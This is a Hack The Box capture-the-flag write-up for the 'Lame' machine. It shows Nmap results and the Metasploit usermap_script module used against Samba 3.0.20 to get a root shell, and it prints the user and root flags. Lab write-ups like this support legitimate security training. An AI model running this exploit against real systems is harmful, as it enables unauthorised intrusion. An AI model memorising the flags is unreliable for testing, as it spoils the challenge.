# 🧠 HTB – Lame

**Difficulty:** Easy  
**Category:** Exploitation  
**Tools Used:** Nmap, Metasploit  
**Privileges:** root (direct)

---

## 🔍 Enumeration

Initial Nmap scan revealed the following open ports:

PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 2.3.4
22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp open netbios-ssn Samba smbd 3.X - 4.X
445/tcp open netbios-ssn Samba smbd 3.0.20-Debian


Anonymous FTP login was allowed, but nothing useful was found there.

Samba version `3.0.20` caught our attention — known for multiple vulnerabilities.

---

## 💥 Exploitation

We searched for relevant exploits in Metasploit:

search samba


We selected the following module:

exploit/multi/samba/usermap_script

This module exploits the `username map script` feature, allowing remote command execution as **root**.

We configured the target and listener:

```bash
use exploit/multi/samba/usermap_script
set RHOST 10.10.10.3
set LHOST <your_IP>
run
A root shell was obtained immediately.

🧑‍💻 Privilege Escalation
Not necessary — we already had a root shell.

Confirmed with:

whoami     # root
id         # uid=0(root)
🏁 Flags

cat /root/root.txt
# 469af12ab221475ad2a4d166f6b53fd9

cat /home/makis/user.txt
# 07d0787ab660ba7a82d1b137477c14d6
✅ Root access obtained directly via Samba RCE.
A great example of exploiting legacy services using Metasploit.

